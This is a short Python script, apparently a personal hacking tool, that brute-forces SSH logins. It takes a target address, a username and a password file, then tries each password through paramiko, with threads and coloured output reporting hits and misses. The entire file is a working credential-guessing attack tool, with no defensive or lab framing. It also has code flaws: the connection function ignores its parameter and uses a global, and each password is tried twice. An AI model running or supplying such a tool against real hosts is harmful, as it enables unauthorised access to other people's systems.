import os
import paramiko
import socket
import sys
import termcolor
import threading
import time


def ssh_connect(passkey, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code


host = input("Enter Address of the Target: ")
username = input("Target SSH username: ")
input_file = input("Passwords file: ")

if not os.path.exists(input_file):
    print("!!! File Does not Exist")
    sys.exit(1)

with open(input_file, "r") as file:
    for line in file.readlines():
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(f"Password found !!! : '{password}' username : '{username}'", "green"))
                t.join()
                exit()
            elif response == 1:
                print(termcolor.colored(f"Incorrect Password :(... : {password}", "yellow"))
            elif response == 2:
                print(termcolor.colored(f"!!! Connection Failed...", "red"))
        except Exception as e:
            print(e)
            pass
